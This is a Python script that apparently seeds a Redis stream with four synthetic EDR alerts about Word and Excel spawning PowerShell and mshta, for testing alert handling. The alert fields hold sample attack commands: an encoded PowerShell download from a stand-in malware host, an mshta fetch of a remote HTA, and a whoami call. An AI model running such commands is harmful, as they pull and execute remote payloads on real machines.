from Lib.redis_stream_api import RedisStreamAPI

alerts = [
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office application launches suspicious process",
        "alert_date": "2025-09-18T13:30:15Z",
        "tags": ["phishing", "office", "powershell"],
        "severity": "Medium",
        "reference": "Host FIN-WKS-JDOE-05 Word launched PowerShell",
        "description": "On host FIN-WKS-JDOE-05, a PowerShell process launched by WINWORD.EXE was detected, which is usually associated with macro viruses or phishing attacks.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "username", "value": "j.doe"},
            {"type": "parent_process_name", "value": "winword.exe"},
            {"type": "parent_process_path", "value": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "process_path", "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"},
            {"type": "command_line",
             "value": "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlLmRvbWFpbi5jb20ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T13:30:14.582Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 6124,
                "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -encodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlLmRvbWFpbi5jb20ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
                "hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1",
                "parent_pid": 4820,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office application launches suspicious process",
        "alert_date": "2025-09-18T13:32:45Z",
        "tags": ["phishing", "office", "powershell"],
        "severity": "Medium",
        "reference": "Host FIN-WKS-JDOE-05 PowerShell launched by Word active again",
        "description": "On host FIN-WKS-JDOE-05, a PowerShell process launched by WINWORD.EXE with the same recent activity was detected again.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "username", "value": "j.doe"},
            {"type": "parent_process_name", "value": "winword.exe"},
            {"type": "parent_process_path", "value": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "process_path", "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T13:32:44.912Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 6188,
                "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -i -c whoami",
                "hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1",
                "parent_pid": 4820,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office application launches suspicious process",
        "tags": ["phishing", "office", "mshta"],
        "alert_date": "2025-09-18T14:50:00Z",
        "severity": "Medium",
        "reference": "Host MKT-WKS-ASMITH-01 Excel launched mshta",
        "description": "On host MKT-WKS-ASMITH-01, a mshta.exe process launched by EXCEL.EXE was detected, which is a common malicious payload execution method.",
        "artifact": [
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "ip", "value": "192.168.2.54"},
            {"type": "username", "value": "a.smith"},
            {"type": "parent_process_name", "value": "excel.exe"},
            {"type": "process_name", "value": "mshta.exe"},
            {"type": "command_line", "value": "mshta.exe http://phishing-site.com/loader.hta"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-marketing01",
            "timestamp": "2025-09-18T14:49:59.123Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 7788,
                "path": "c:\\windows\\system32\\mshta.exe",
                "command_line": "mshta.exe http://phishing-site.com/loader.hta",
                "hash_sha256": "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
                "parent_pid": 5544,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\excel.exe"
            },
            "user_details": {"username": "a.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "MKT-WKS-ASMITH-01", "ip_address": "192.168.2.54"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office application launches suspicious process",
        "alert_date": "2025-09-18T14:51:30Z",
        "tags": ["phishing", "office", "mshta"],
        "severity": "High",
        "reference": "Host MKT-WKS-ASMITH-01 repeatedly detected Excel launching suspicious process",
        "description": "On host MKT-WKS-ASMITH-01, a mshta.exe process launched by EXCEL.EXE was detected again.",
        "artifact": [
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "ip", "value": "192.168.2.54"},
            {"type": "username", "value": "a.smith"},
            {"type": "parent_process_name", "value": "excel.exe"},
            {"type": "process_name", "value": "mshta.exe"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-marketing01",
            "timestamp": "2025-09-18T14:51:29.678Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 7810,
                "path": "c:\\windows\\system32\\mshta.exe",
                "command_line": "mshta.exe http://phishing-site.com/loader.hta",
                "hash_sha256": "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
                "parent_pid": 5544,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\excel.exe"
            },
            "user_details": {"username": "a.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "MKT-WKS-ASMITH-01", "ip_address": "192.168.2.54"}
        }
    }
]
if __name__ == "__main__":
    redis_stream_api = RedisStreamAPI()
    for mail in alerts:
        redis_stream_api.send_message("EDR-Rule-11-Suspicious-Process-Spawned-by-Office", mail)
